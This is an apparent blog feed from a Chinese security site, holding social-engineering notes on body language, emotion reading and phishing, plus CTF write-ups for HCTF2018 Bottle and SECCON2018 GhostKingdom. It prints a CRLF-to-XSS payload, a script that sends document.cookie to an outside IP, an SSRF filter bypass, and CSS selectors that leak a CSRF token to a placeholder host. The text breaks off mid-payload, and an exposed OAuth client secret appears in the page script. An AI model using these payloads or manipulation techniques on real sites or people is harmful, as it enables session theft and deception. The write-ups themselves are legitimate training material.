对抗地心引力的动作姿态（弹跳、摇摆、抬起脚尖）——开心<br>  脚、腿部的朝向——指向想去的地方<br>  扩大双脚站立的距离——感受到威胁（领地意识）<br>  跷二郎腿：朝向喜欢的人/不朝向喜欢的人（设置屏障）</p></li><li><p>躯干和身体语言</p><ul><li>躯干倾斜<br>  人们的躯干无意识会倾斜于他们喜欢的事物，远离他们不喜欢的事物</li><li>胸部的起伏<br>  胸部的起伏和粗重的呼吸：为吸入更多氧气（不适）</li><li>手臂<br>  开放的双臂（腹部）、手臂前端或敏感部位暴露：信任<br>  封闭（交叉）：设置屏障（高于胃部，低于胸部，防御姿态）</li><li>腹部<br>  开放的腹部表示自信、信任</li><li>肩部<br>  耸肩：不确定、不适、不知道，表疑问或否定</li></ul></li><li><p>舒适与不适（操纵性动作）</p><ul><li><p>颈部<br>  当人们在做艰难的决定时，揉搓或抚摸流经颈部（后颈部）和胸上部（胸骨切迹）的两条神经（交感神经和颈动脉窦）能起到安抚作用：紧张、怀疑、害怕、担忧、威胁</p></li><li><p>脸部<br>  揉搓脸部：威胁、不安全、不适、怀疑</p></li><li><p>嘴部<br>  捂嘴：害怕、惊讶、恐惧、震惊、悲伤（自我安慰）</p><blockquote><p>融入群体：自己和周围的人群表相处相同的情绪，寻找或制造一种利用重大事件加入群体的情况</p></blockquote></li><li><p>唇部<br>  双唇紧闭：压抑愤怒，阻止想说的话<br>  双唇撅起：不确定，认知负荷（一般会伴随眉头紧锁），犹豫不决<br>  咬唇（咬手指，嚼东西）：认知负荷，焦虑</p></li><li><p>眼部<br>  罩住眼睛：情绪激动（悲伤、愤怒），阻止视觉刺激</p></li><li><p>头部<br>  倾斜头部：开放，信任（伴随微笑）</p></li><li><p>胸部<br>  双臂交叉环胸：自我安慰（紧张）</p></li></ul></li><li><p>RSVP<br>  节奏Rhythm/语速Speed/音量Volume/音高Pitch<br>  代词的变化（语言风格）<br>  口吃和用词重复的增加（语言风格）——忧虑、压力<br>  声调的变化——情绪<br>  不做正面答复<br>  停顿——认知负荷，通常伴随眼部动作</p></li></ul><hr><h2 id="人际距离学"><a href="#人际距离学" class="headerlink" title="人际距离学"></a>人际距离学</h2><p>对周围空间的使用方式</p><ul><li>公共空间<br>  说话，听众<br>  4～8米</li><li>社交空间<br>  适用于社交场合<br>  1.2～3米</li><li>私人空间<br>  同家人或朋友互动<br>  0.6～1.2米</li><li>亲密空间<br>  可以亲密接触的人<br>  小于0.3米</li></ul><hr><h2 id="触摸"><a href="#触摸" class="headerlink" title="触摸"></a>触摸</h2><p>在交流过程中传递情感，并建立信任感（建立和谐的氛围）</p><hr><h2 id="眼神交流"><a href="#眼神交流" class="headerlink" title="眼神交流"></a>眼神交流</h2><p>观察他人的情绪状态</p><hr><h2 id="嗅觉学"><a href="#嗅觉学" class="headerlink" title="嗅觉学"></a>嗅觉学</h2><p>触发人们对人，事，物的回忆和情感</p><hr><h2 id="着装"><a href="#着装" class="headerlink" title="着装"></a>着装</h2><p>着装认知：服装的象征意义和身体穿着体验的共存</p><hr><h2 id="面部表情"><a href="#面部表情" class="headerlink" title="面部表情"></a>面部表情</h2><blockquote><p>宏表情：2～4秒，有意识，可控<br>微表情：0.04～0.2秒，无意识，不可控</p></blockquote><p>注意：不要将自己的情绪加入到观察的情绪中</p><ul><li><p>热点（Hotspot）<br>  与言行不一致的微表情或其他表现<br>  当发现热点的时候，开始寻找出现热点的原因，不要只关注一种可能性，通过“对立假设”思考热点出现的原因，增加客观性<br>  做一个积极的聆听者和观察者，不要只关注一件事（面部、肢体语言、嗓音、声线、声音内容）<br>  不要急于作出判断，充分利用所有可利用的时间、语言、非语言线索<br>  注意所有出现的热点，但是在跟进、挑战或对峙时要有选择的利用热点<br>  不要假定目标为什么会出现那种情绪，而是通过问题、基准太和访问策略深入研究情绪的成因</p></li><li><p>情绪<br>  一种受人们自己的过去影响的过程和特定的自我评价<br>  大脑基于之前的经历和生物活动而形成的一组心里原则，用来处理当前所遇到的任何情况</p></li></ul><p>七种基本情绪：恐惧，惊讶，悲伤，轻视，厌恶，愤怒，开心</p><ul><li><p>恐惧<br>  恐惧经常被用来诱导目标至特定的反应和动作<br>  也可以将恐惧重定向到其他情绪</p><ul><li>特征<br>  瞪大双眼，挑起眉毛，嘴唇同时向耳朵拉起，上眼皮抬起，露出虹膜上方的眼白</li><li>练习<ol><li>尽量抬高上眼睑，同时尽量收紧下眼睑</li><li>水平咧开嘴巴，嘴唇水平伸展</li><li>在收紧上眼睑的时候抬高眼眉，露出虹膜上方的眼白，头向后仰</li></ol></li><li>或战或逃<br>  因为紧张而倒吸一口气或尖叫，头和身体也向后退，远离害怕的东西</li></ul></li><li><p>惊讶<br>  眼睛比恐惧时更放松，眼眉的拱形和扬起的程度更大，嘴唇垂直拉起而不是水平</p><ul><li>特征<br>  眉毛上扬，下颚张开，双眼睁大，</li><li>练习<ol><li>在扬起眉毛的同时尽量睁大眼睛</li><li>下巴微微分开</li></ol></li><li>通路情绪<br>  使人们先退到一边，意识到安全后再走近让人们意外的东西，身体也会倾向于那个带来惊讶的物品-&gt;开心，微笑</li></ul></li><li><p>悲伤<br>  可能会使用虚假的微笑或坚韧的眼神隐藏悲伤，凝视正前方，面容呆滞<br>  在极度悲伤时嘴巴会张开的更大<br>  营造悲伤的气氛，激发人们采取某些行动——利用同情心</p><ul><li>特征<br>  最佳下列，上眼睑下垂，外嘴角下斜，眉毛内侧上扬，眉头抬起向中间聚拢，双目低垂，嘴角下垂，下唇中心向外突出</li><li>练习<ol><li>嘴角下拉（嘴巴张开或不张开）</li><li>上抬脸颊</li><li>上眼睑下垂，向下看</li><li>头部向下，前颚紧绷</li><li>眼眉内角皱在一起</li></ol></li></ul></li><li><p>轻视<br>  对那些在道义或社交上逊于自己的个人或群体的情感反应<br>  将轻视的对象排挤出自己的社交团体或阶层<br>  通常会伴随愤怒<br>  当嘴和脸颊的一侧抬起后，往往会产生假笑，点头或仰起头，表现自大</p><ul><li>特征<br>  皱起的鼻子，上启的嘴唇，通常只出现在脸的一侧，眼部不对称，一侧脸颊上抬，嘴部不对称，下巴上抬</li><li>练习<ol><li>扬起一侧的脸，仿佛脸颊挤压导致眯眼</li><li>扬起下巴，为了俯视轻蔑对象</li><li>颊肌抬起，脸部同侧的唇角会产生不对称上扬</li></ol></li></ul></li><li><p>厌恶<br>  通常伴随愤怒、不满、不安与急躁</p><ul><li>特征<br>  上唇上启，漏出牙齿，鼻子皱成一团，双颊上移</li><li>练习<ol><li>皱鼻（鼻梁）</li><li>嘴唇卷起来，有时也会张开并露出牙齿（上牙）</li><li>脸颊出现大幅褶皱</li><li>眉头紧锁</li></ol></li></ul></li><li><p>愤怒<br>  愤怒时无法清晰思考（杏仁核劫持）</p><ul><li>特征<br>  紧抿双唇，眉头紧锁，双眼圆瞪</li><li>练习<ol><li>拉低眉毛（有时会皱起来）</li><li>尝试瞪眼</li><li>紧紧挤压嘴唇，咬紧牙齿，收紧下颚</li><li>下巴通常收紧以保护颈部</li><li>呼吸粗重，变得紧张，心跳加快</li></ol></li></ul></li><li><p>开心</p><ul><li>真诚的微笑（易传染）<br>  颧骨和眼轮匝肌的肌肉分别带动嘴角和脸颊肌肉提起，形成鱼尾纹</li><li>礼貌的微笑（社交微笑）<br>  眼睛没有明显变化</li><li>练习<ol><li>扬起嘴角，抬高脸颊，嘴唇上啦</li><li>不眯眼睛，提高脸颊，将下眼睑上推，形成鱼尾纹</li></ol></li></ul></li><li><p>利用</p><ul><li>情景诱导<br>  通过情绪上的微妙暗示操纵他人达到特定的情绪状态</li><li>识别欺骗<br>  矛盾：发现矛盾-&gt;继续挖掘更多信息-&gt;询问矛盾点-&gt;观察微表情<br>  犹豫：通过犹豫（或者重复问题）来拖延时间以编造谎言<br>  行为变化：每次谈到特定的话题可能导致某一特定行为的变化<br>  手势：手势幅度、频率、时长的变化</li></ul></li></ul><h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>以对收件人施加影响或获得个人信息为目的，发送者看似来自权威来源的电子邮件</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>钱</li><li>信息</li><li>政治目的/个人信仰</li></ul><hr><h2 id="手段"><a href="#手段" class="headerlink" title="手段"></a>手段</h2><ul><li>邮件钓鱼</li><li>网站克隆</li><li>电话钓鱼<br>  增加邮件的真实性/直接索取信息</li></ul><hr><h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><ul><li>尼日利亚419骗局（预付款骗局）</li><li>金融类<br>  账户有异常登录请求<br>  银行升级在线安全措施<br>  未按时还款或纳税</li><li>社交媒体</li><li>利用公共事件（杏仁核劫持）<br>  贪婪、恐惧、敬畏权威、渴望交流、好奇、同情</li></ul><hr><h2 id="检测特征"><a href="#检测特征" class="headerlink" title="检测特征"></a>检测特征</h2><ul><li>含糊的称呼/签名</li><li>未知的/令人怀疑的网址链接</li><li>未知的/令人怀疑的发送者</li><li>错别字以及语法，拼写和标点符号错误</li><li>不合情理的借口</li></ul><hr><h2 id="钓鱼攻击分类"><a href="#钓鱼攻击分类" class="headerlink" title="钓鱼攻击分类"></a>钓鱼攻击分类</h2><ul><li><p>一级钓鱼攻击</p><ul><li>非指向性问候和结束语</li><li>拼写错误和糟糕的语法</li><li>简易的信息/不太可能成立的理由</li><li>引起贪婪、恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>奇怪的邮件地址/未知的发件人</li></ul></li><li><p>二级钓鱼攻击</p><ul><li>非指向性问候和结束语</li><li>拼写正确但是有一些语法问题</li><li>信息更加复杂但仍然很基本</li><li>引起贪婪、恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>奇怪的邮件地址/未知的发件人</li></ul></li><li><p>三级钓鱼攻击</p><ul><li>指向性问候和结束语</li><li>正确的拼写和不错的语法</li><li>复杂的信息，会引起恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>有时候会出现奇怪的邮件地址，但是发件人合法</li><li>很多时候会出现商标</li></ul></li><li><p>四级钓鱼攻击</p><ul><li>鱼叉式钓鱼攻击<br>  针对特定目标进行个人定制</li><li>OSINT<br>  Open-source intelligence（获取开放性情报）</li></ul></li></ul><hr><h2 id="心理学原理"><a href="#心理学原理" class="headerlink" title="心理学原理"></a>心理学原理</h2><ul><li><p>决策</p><ol><li>决策的好坏并不总是与我们对这个决策本身是否感到满意有关</li><li>决策包含了一系列因素，例如我们的看法和情绪</li><li>我们每天都在作出或大或小的决策，即使在并不具备所需要的全部相关信息下</li><li>我们不假思索的，频繁的作出这些或大或小的决策</li></ol></li><li><p>影响因素</p><ul><li>认知偏差<br>  通常源于过去的经验<ul><li>框架效应<br>  反应依赖语境</li><li>可用性启发法<br>  依赖于我们容易想起的事物</li><li>确认偏误<br>  倾向于寻找支持自己观点的信息—偏执</li></ul></li><li>生理状态<br>  饥饿、困倦、疲劳等负面的身体状态</li><li>外部因素<br>  环境、形势的不确定性</li></ul></li><li><p>基础决策模型<br>  定义问题（正确理解问题）-&gt;收集信息-&gt;权衡选择-&gt;作出决策-&gt;评估结果</p></li><li><p>情绪化决策（杏仁核劫持）<br>  基于情绪的钓鱼攻击-&gt;引起大脑和身体反应-&gt;情绪战胜逻辑-&gt;缺乏理性导致错误决策-&gt;产生情绪化行为</p></li><li><p>影响与操控<br>  决策的催化剂</p></li></ul><hr><h2 id="保护与绕过"><a href="#保护与绕过" class="headerlink" title="保护与绕过"></a>保护与绕过</h2><ul><li><p>批判性思维<br>  告诉自己不要事都信以为真<br>  绕过：利用情绪阻止批判性思维-&gt;杏仁核劫持</p></li><li><p>悬停<br>  把鼠标悬停在连接上<br>  绕过：购买看似合法的域名</p></li><li><p>URL解析<br>  绕过：购买看似合法的域名</p></li><li><p>分析邮件头<br>  绕过：对网络进行渗透，获取SMTP服务器</p></li></ul><table><thead><tr><th>邮件头</th><th>解释</th></tr></thead><tbody><tr><td>To</td><td>发送至</td></tr><tr><td>Reply-To</td><td>回复至</td></tr><tr><td>Delivered-To</td><td>已发送至</td></tr><tr><td>X-Received</td><td>邮件来源</td></tr><tr><td>Return-Path</td><td>返回路径</td></tr><tr><td>Received-Spf</td><td>发件人SPF</td></tr><tr><td>Authentication-Results</td><td>身份认证结果</td></tr><tr><td>Dkim-Signature</td><td>DKIM签名</td></tr><tr><td>Domainkey-Signature</td><td>域名密钥签名</td></tr><tr><td>Message-Id</td><td>信息编号</td></tr><tr><td>List-Unsubscribe</td><td>退订信息</td></tr><tr><td>Mime-Version</td><td>MIME版本</td></tr><tr><td>Content-Type</td><td>内容类型</td></tr></tbody></table><ul><li>沙盒<br>  创建一个可以运行未经检测或不受信任的代码的环境</li></ul><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      社会工程学是一种操纵他人采取特定行动的行为，该行动不一定符合目标的最佳利益，其结果包括获取信息，取得访问权限或者让目标采取特定的行动。
    
    </summary>
    
    
      <category term="hack" scheme="https://srpopty.github.io/categories/hack/"/>
    
    
      <category term="social_engineering" scheme="https://srpopty.github.io/tags/social-engineering/"/>
    
  </entry>
  
  <entry>
    <title>针对某三流安全公司的渗透</title>
    <link href="https://srpopty.github.io/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/"/>
    <id>https://srpopty.github.io/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/</id>
    <published>2019-01-27T10:51:10.000Z</published>
    <updated>2020-03-11T13:43:36.819Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password!" data-whm="Wrong password hash!"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Enter password here." /><label>Enter password here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="2d46b7ec1d439b5b6ad9d75cd72e6db731a6483d7a2476e2b8ad7ed4126e79ef"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      ...
    
    </summary>
    
    
      <category term="hack" scheme="https://srpopty.github.io/categories/hack/"/>
    
    
      <category term="social_engineering" scheme="https://srpopty.github.io/tags/social-engineering/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018 Bottle Writeup</title>
    <link href="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/"/>
    <id>https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/</id>
    <published>2018-11-12T12:23:58.000Z</published>
    <updated>2020-03-11T13:09:44.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: *&#x2F;3 *&#x2F;10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http:&#x2F;&#x2F;bottle.2018.hctf.io</span><br></pre></td></tr></table></figure><p>后端是个python，根据题目可知这个应用使用了bottle框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p><p>登录与注册的时候发现中间经过了一个path跳转<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png" alt></p><p>bottle框架比较出名一点的漏洞是HTTP头注入漏洞(CVE-2016-9964)<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png" alt></p><p>在path跳转时可进行CRLF注入<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png" alt></p><p>所以思路是利用CRLF注入，将XSS内容写入到body中，将这个网址提交给管理员，管理员访问这个网址，触发XSS达到cookie</p><p>这里有一个问题:当浏览器发现Location可以跳转时，将不会对body中的HTML进行渲染而直接跳转，只有Location为空时才不会跳转。但是此题中Location又不能为空(会500)，因此当管理员访问这个网址时肯定会跳转。不过Hint中提到”bot use firefoxDriver”，而在FireFox中，当Location目标网址的端口小于80时不会对Location跳转</p><p>因此构造网址如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript%3Ea&#x3D;1%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>注意到题目中还设置了CSP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure><p>后来出题人再修复此题之后将CSP放在了CRLF注入点的下面，这样就可以直接把CSP挤到body中，浏览器便不会解析CSP</p><p>在本地FireFox中测试<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png" alt><br>这里不使用alert测试是因为当URL中存在引号或括号时会500</p><p>于是将script的src指向自己服务器的js文件即可任意XSS，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript+src&#x3D;http:&#x2F;&#x2F;srpopty.cn&#x2F;1.js%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">ajax.open(<span class="string">"GET"</span>,<span class="string">"http://123.206.86.208/xss/"</span>+<span class="built_in">document</span>.cookie,<span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ajax.send();</span><br></pre></td></tr></table></figure><p>拿到管理员的cookie<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png" alt></p><p>修改cookie登录拿到flag<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png" alt></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      HCTF2018 bottle writeup.
    
    </summary>
    
    
      <category term="ctf" scheme="https://srpopty.github.io/categories/ctf/"/>
    
    
      <category term="writeup" scheme="https://srpopty.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Seccon2018 GhostKingdom Writeup</title>
    <link href="https://srpopty.github.io/2018/10/28/Seccon2018-GhostKingdom-Writeup/"/>
    <id>https://srpopty.github.io/2018/10/28/Seccon2018-GhostKingdom-Writeup/</id>
    <published>2018-10-28T07:23:58.000Z</published>
    <updated>2020-03-11T13:06:04.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GhostKindom"><a href="#GhostKindom" class="headerlink" title="GhostKindom"></a>GhostKindom</h1><p>网站最开始登陆以后只有两个功能，给admin发送消息以及对指定url地址的网页截屏，第三个upload image功能需要在本地登录后才知道url地址</p><p>首先尝试截屏功能有没有ssrf，发现127.0.0.1这类的地址被过滤了<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027231049.png" alt></p><p>于是更改127.0.0.1的格式为2130706433，原理是将点分十进制的ip地址转换为十进制的ip地址，它们本质上是一样的</p><p>发现可以访问127.0.0.1的网址，但是需要登录<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027231307.png" alt></p><p>但是这个网站在登录与注册时，所提交的用户名和密码都是用get方式的，所以可以用get登录，在截屏的目标url中填入<br><code>http://2130706433/?user=username&amp;pass=password&amp;action=login</code><br>即可登录成功，服务器会自动记录session，所以只需登录一次，下次截屏时就能访问其他的网页了</p><p>可以看到通过截屏可以访问upload image，但是却不知道upload image的url地址，所以现在的目标就是获取upload image的地址<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027232032.png" alt></p><p>这个网站还有另一个功能，可以给admin留言，但是经过测试发现并没有留言功能，但是在留言之前可以预览自己的留言，而这里可以进行css的注入<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/IYF7PP3R055_66RTM9M3CX.png" alt></p><p>“c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9”经过base64解码后就是”span{background-color:red;color:yellow}”，所以这里的css是可以控制的</p><p>注意到一个csrf参数，可以看到csrf的值就是cookie的值<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/SUGQFXO7YMRUAG9LHT.png" alt></p><p>所以这里可以利用css来获取源码中的csrf值，也就是cookie，于是思路如下：<br>先利用截屏功能的ssrf登录，使服务器端获取到一个cookie，之后在截屏的ssrf中的预览留言的界面用css获取到csrf的值，拿到在127.0.0.1登录的账号的cookie，劫持以后就可以获取upload image的url了</p><p>在预览界面的html如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span></span></span><br><span class="line"><span class="meta"><span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">lang</span>=<span class="string">"ja"</span> <span class="attr">xml:lang</span>=<span class="string">"ja"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>SECCON 2018<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- by KeigoYAMAZAKI, 2018.08.31- --&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">h2</span>&#123;<span class="attribute">border</span>:double <span class="number">#668ad8</span>;<span class="attribute">border-width</span>:<span class="number">6px</span> <span class="number">0</span> <span class="number">6px</span> <span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">color</span>:<span class="number">#668ad8</span>&#125; <span class="selector-class">.main</span>&#123;<span class="attribute">background-color</span>:<span class="number">#e1e1e1</span>;<span class="attribute">color</span>:black;<span class="attribute">width</span>:<span class="number">85%</span>;<span class="attribute">padding</span>:<span class="number">60px</span>;<span class="attribute">margin</span>:<span class="number">40px</span> auto;<span class="attribute">border</span>:<span class="number">2px</span> solid <span class="number">#C6B665</span>&#125;<span class="selector-class">.msg</span>&#123;<span class="attribute">padding</span>:<span class="number">15px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid black&#125; <span class="selector-class">.ok</span>&#123;<span class="attribute">color</span>:blue&#125; <span class="selector-class">.warn</span>&#123;<span class="attribute">color</span>:orange&#125; <span class="selector-class">.err</span>&#123;<span class="attribute">color</span>:red&#125; <span class="selector-class">.green</span>&#123;<span class="attribute">background-color</span>:lightgreen&#125; <span class="selector-class">.btn</span>&#123;<span class="attribute">background</span>:<span class="number">#668ad8</span>;<span class="attribute">color</span>:white;<span class="attribute">padding</span>:<span class="number">0.5em</span>;<span class="attribute">margin</span>:<span class="number">10px</span>&#125; <span class="selector-class">.sshot</span>&#123;<span class="attribute">border</span>:<span class="number">2px</span> solid white&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"seccon2018_logo.png"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"?"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">span</span>&#123;<span class="attribute">background-color</span>:red;<span class="attribute">color</span>:yellow&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"msg"</span>&gt;</span>Message: 1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">value</span>=<span class="string">"da2b6930fb2a34afefb268"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"msgadm3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn"</span> <span class="attr">value</span>=<span class="string">"Send to admin"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关于使用css获取数据，payload如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"a"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=a"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"c"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=c"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"d"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=d"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"e"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=e"</span>)&#125;</span><br><span class="line"><span 